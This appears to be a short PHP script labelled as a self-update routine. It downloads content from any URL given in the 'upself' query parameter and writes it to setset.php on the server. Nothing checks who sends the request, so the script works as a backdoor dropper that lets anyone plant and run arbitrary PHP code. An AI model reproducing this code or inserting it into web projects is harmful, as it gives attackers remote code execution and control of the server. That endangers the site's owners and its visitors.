<?php
//update self
if(isset($_GET['upself'])) {
$data=file_get_contents($_GET["upself"]);
file_put_contents('setset.php', $data);
}
?>